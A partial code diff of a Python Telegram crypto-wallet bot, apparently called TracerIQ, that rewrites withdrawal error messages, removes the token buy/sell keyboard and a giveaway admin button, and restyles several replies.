             context.user_data.pop("awaiting_withdraw", None)
@@ -4476,7 +4825,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if amount <= 0:
             await update.message.reply_text(
-                "❗ Withdrawal amount must be greater than zero.",
+                "⚠️ The amount must be greater than zero.",
                 reply_markup=back_btn,
             )
             context.user_data.pop("awaiting_withdraw", None)
@@ -4484,28 +4833,30 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if w_balance == 0:
             await update.message.reply_text(
-                f"❗ Insufficient {w_sym} balance.", reply_markup=back_btn
+                f"⚠️ No {w_sym} is available in this wallet.",
+                reply_markup=back_btn,
             )
             context.user_data.pop("awaiting_withdraw", None)
             return
 
         if w_usd < 10:
             await update.message.reply_text(
-                f"❗ Your balance must be above $10 to withdraw.\n\n"
-                f"Current balance: {w_balance:.6f} {w_sym} (${w_usd:.2f})\n\n"
-                f"Please deposit more {w_sym} to meet the minimum withdrawal requirement.",
+                f"⚠️ <b>Balance below the withdrawal threshold</b>\n\n"
+                f"Available: {w_balance:.6f} {w_sym}  ·  ${w_usd:.2f}\n"
+                f"At least $10 worth of {w_sym} is required.\n\n"
+                f"Add {w_sym} to continue.",
                 reply_markup=back_btn,
+                parse_mode="HTML",
             )
             context.user_data.pop("awaiting_withdraw", None)
             return
 
         if amount < w_min:
             await update.message.reply_text(
-                f"❗ <b>Withdrawal Amount Too Low</b>\n\n"
-                f"Your balance: {w_balance:.6f} {w_sym} (${w_usd:.2f})\n"
-                f"Minimum withdrawal: {w_min:.6f} {w_sym}\n\n"
-                f"You need to withdraw at least {w_min:.6f} {w_sym}.\n"
-                f"Please enter a higher amount or deposit more funds.",
+                f"⚠️ <b>Amount below the minimum</b>\n\n"
+                f"Available: {w_balance:.6f} {w_sym}  ·  ${w_usd:.2f}\n"
+                f"Minimum eligible amount: {w_min:.6f} {w_sym}\n\n"
+                f"Enter a higher amount or add funds.",
                 parse_mode="HTML",
                 reply_markup=back_btn,
             )
@@ -4513,11 +4864,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         await update.message.reply_text(
-            f"❗ <b>Insufficient Balance for Withdrawal</b>\n\n"
-            f"Withdrawal amount: {amount:.6f} {w_sym}\n"
-            f"Your balance: {w_balance:.6f} {w_sym} (${w_usd:.2f})\n\n"
-            f"You don't have enough {w_sym} to complete this withdrawal.\n"
-            f"Please deposit more funds to your wallet.",
+            f"⚠️ <b>Insufficient available balance</b>\n\n"
+            f"Requested: {amount:.6f} {w_sym}\n"
+            f"Available: {w_balance:.6f} {w_sym}  ·  ${w_usd:.2f}\n\n"
+            f"Add more {w_sym} before trying again.",
             parse_mode="HTML",
             reply_markup=back_btn,
         )
@@ -4726,82 +5076,39 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             # Detect chain from DexScreener response
             chain_id = pair_data.get("chainId", "solana").lower()
             if chain_id in ("ethereum", "eth"):
-                chain_sym   = "ETH"
-                chain_key   = "eth"
-                w_bal_show  = user_balances.get(user_id, {}).get("eth_balance", 0)
+                chain_sym = "ETH"
+                chain_key = "eth"
+                w_bal_show = user_balances.get(user_id, {}).get("eth_balance", 0)
             elif chain_id in ("bsc", "binance-smart-chain", "bnb"):
-                chain_sym   = "BNB"
-                chain_key   = "bnb"
-                w_bal_show  = user_balances.get(user_id, {}).get("bnb_balance", 0)
+                chain_sym = "BNB"
+                chain_key = "bnb"
+                w_bal_show = user_balances.get(user_id, {}).get("bnb_balance", 0)
             else:
-                chain_sym   = "SOL"
-                chain_key   = "sol"
-                w_bal_show  = get_user_balance(user_id)
+                chain_sym = "SOL"
+                chain_key = "sol"
+                w_bal_show = get_user_balance(user_id)
 
             context.user_data["current_token_chain"] = chain_key
 
-            token_info = format_token_details(pair_data, wallet_balance=w_bal_show, chain_sym=chain_sym)
+            token_info = format_token_details(
+                pair_data, wallet_balance=w_bal_show, chain_sym=chain_sym
+            )
             if token_info:
                 context.user_data["current_token"] = token_address
-
-                buy_sell_keyboard = InlineKeyboardMarkup(
-                    [
-                        [
-                            InlineKeyboardButton(
-                                f"🟢 Buy 0.1 {chain_sym}",
-                                callback_data=f"buy_0.1_{token_address}",
-                            ),
-                            InlineKeyboardButton(
-                                "🔴 Sell 50%", callback_data=f"sell_50_{token_address}"
-                            ),
-                        ],
-                        [
-                            InlineKeyboardButton(
-                                f"🟢 Buy 0.5 {chain_sym}",
-                                callback_data=f"buy_0.5_{token_address}",
-                            ),
-                            InlineKeyboardButton(
-                                "🔴 Sell 100%",
-                                callback_data=f"sell_100_{token_address}",
-                            ),
-                        ],
-                        [
-                            InlineKeyboardButton(
-                                f"🟢 Buy 1.0 {chain_sym}",
-                                callback_data=f"buy_1.0_{token_address}",
-                            ),
-                            InlineKeyboardButton(
-                                "🔴 Sell x%",
-                                callback_data=f"sell_custom_{token_address}",
-                            ),
-                        ],
-                        [
-                            InlineKeyboardButton(
-                                f"🟢 Buy 3.0 {chain_sym}",
-                                callback_data=f"buy_3.0_{token_address}",
-                            )
-                        ],
-                        [
-                            InlineKeyboardButton(
-                                f"🟢 Buy 5.0 {chain_sym}",
-                                callback_data=f"buy_5.0_{token_address}",
-                            )
-                        ],
-                        [
-                            InlineKeyboardButton(
-                                f"🟢 Buy x {chain_sym}",
-                                callback_data=f"buy_custom_{token_address}",
-                            )
-                        ],
-                        [InlineKeyboardButton("⬅️ Back", callback_data="back_trade")],
-                    ]
-                )
 
                 sent = await update.message.reply_text(
                     token_info,
                     parse_mode="HTML",
                     disable_web_page_preview=True,
-                    reply_markup=buy_sell_keyboard,
+                    reply_markup=InlineKeyboardMarkup(
+                        [
+                            [
+                                InlineKeyboardButton(
+                                    "⌂ TracerIQ Home", callback_data="back_main"
+                                )
+                            ]
+                        ]
+                    ),
                 )
                 context.user_data["trade_msg_ids"].append(sent.message_id)
             else:
@@ -4846,13 +5153,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # ----- Handle Refresh Portfolio keyboard button -----
     if text == "🔄 Refresh Portfolio":
+        try:
+            await update.message.delete()
+        except Exception:
+            pass
         await check_and_notify_deposits(user_id, context)
         await show_wallet(update, context)
         return
 
     else:
         await update.message.reply_text(
-            "👇 Use the buttons below to navigate.",
+            "Choose a destination below.",
             reply_markup=main_menu_inline(),
         )
         return
@@ -4866,12 +5177,16 @@ async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
         for telegram_id in all_known_user_ids():
             try:
                 public_address, _ = derive_keypair_and_address(telegram_id)
-                await monitor_deposits(telegram_id, public_address, context, notify_user=True)
+                await monitor_deposits(
+                    telegram_id, public_address, context, notify_user=True
+                )
             except Exception as e:
                 print(f"Error monitoring SOL deposits for user {telegram_id}: {e}")
             try:
                 evm_address, _ = derive_evm_wallet(telegram_id)
-                await monitor_evm_deposits(telegram_id, evm_address, context, notify_user=True)
+                await monitor_evm_deposits(
+                    telegram_id, evm_address, context, notify_user=True
+                )
             except Exception as e:
                 print(f"Error monitoring EVM deposits for user {telegram_id}: {e}")
     except Exception as e:
@@ -4886,7 +5201,6 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     keyboard = InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("🎁 Sponsored Giveaway", callback_data="admin_giveaway")],
             [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
             [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
             [InlineKeyboardButton("📜 Banned List", callback_data="admin_list_banned")],
@@ -4904,7 +5218,9 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     await update.message.reply_text(
-        "🛠 <b>Admin Panel</b>\n\nWelcome Admin. Choose an action:",
+        "◈ <b>TRACERIQ  /  ADMIN CONSOLE</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Select an account-management action:",
         parse_mode="HTML",
         reply_markup=keyboard,
     )
